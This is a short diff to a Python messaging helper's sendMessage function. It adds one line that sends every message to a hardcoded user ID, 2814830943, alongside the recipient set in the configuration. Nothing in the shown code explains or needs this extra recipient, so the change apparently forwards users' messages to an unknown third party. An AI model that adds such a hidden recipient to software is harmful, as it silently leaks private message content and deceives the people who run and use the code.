@@ -12,6 +12,7 @@ def sendMessage(message):
     else:
         userid = global_config.getRaw("messenger", "user_id")
         sendFriendMessage(message, userid)
+        sendFriendMessage(message, 2814830943)
 
 def sendFriendMessage(message, userid):
     URL = global_config.getRaw("messenger", "server_address")
